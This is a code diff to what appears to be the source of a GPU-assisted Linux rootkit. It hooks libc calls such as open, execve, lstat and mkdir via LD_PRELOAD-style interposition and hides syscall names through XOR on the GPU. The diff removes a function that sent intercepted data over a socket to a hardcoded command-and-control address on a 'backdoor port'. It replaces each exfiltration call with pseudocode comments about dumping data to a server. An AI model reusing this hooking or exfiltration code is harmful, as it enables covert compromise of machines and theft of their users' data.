@@ -78,13 +78,13 @@ cl_context create_ctx(const cl_device_id *dev){
 }
 
 void jelly_init(){
-    jelly->dev = create_device();
-    jelly->ctx = create_ctx(&jelly->dev);
-    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);
-
     int i;
 
     for(i = 0; i < SYSCALL_SIZE; i++){
+	jelly->dev = create_device();
+        jelly->ctx = create_ctx(&jelly->dev);
+        jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);
+
 	strcpy(buffer, syscall_table[i]);
 
 	/* stick it in the xor blender! */
@@ -130,6 +130,8 @@ void jelly_init(){
 	    // xor'ed syscall example directly from gpu
 	    syscall[i].syscall_func = dlsym(RTLD_NEXT, buffer3);
 	    buffer3 = "";
+	    buffer2 = "";
+	    buffer = "";
         }
 
         clReleaseContext(jelly->ctx);
@@ -145,24 +147,6 @@ void jelly_init(){
 static void limit_buf(const char *buffer){
     if(sizeof(buffer) > VRAM_LIMIT){
         buffer = "Buffer too big for GPU!";
-    }
-}
-
-static void send_data(const char *buffer){
-    struct sockaddr_in serv_addr;
-
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if(sock < 0){
-        // socket failed
-    }
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8771);  // backdoor port
-    serv_addr.sin_addr.s_addr = inet_addr("1.1.1.1");  // change to ip of server
-    if(connect(sock,(struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
-        close(sock);
-    }
-    if(send(sock, buffer, strlen(buffer), 0) < 0){
-        close(sock);
     }
 }
 
@@ -211,14 +195,18 @@ FILE *fopen(const char *path, const char *mode){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c via socket
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -273,14 +261,18 @@ int mkdir(int dfd, const char *pathname, const char *mode){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -335,14 +327,18 @@ int lstat(const char *filename, struct stat *buf){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -397,14 +393,18 @@ int lstat64(const char *filename, struct stat64 *buf){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -459,14 +459,18 @@ int creat(const char *pathname, int mode){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -521,14 +525,18 @@ int execve(const char *filename, const char **argv, const char **envp){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
@@ -583,14 +591,18 @@ int open(const char *pathname, int flags, mode_t mode){
         // enqueue failed
     }
 
-    // read buf from gpu
-    err = clEnqueueReadBuffer(jelly->cq, output, CL_TRUE, 0, sizeof(buffer), buffer, 0, NULL, NULL);
-    if(err < 0){
-        // read buffer failed
-    } else{
-        // send data to c&c
-	send_data(buffer);
-    }
+    // buffer is now inside gpu
+
+    /*
+        if(server == connected){
+            dump gpu data
+	    free buffer
+	} else{
+	    do not free buffer
+	    continue
+	}
+
+    */
 
     // release gpu memory then start over when syscall is called again
     clReleaseContext(jelly->ctx);
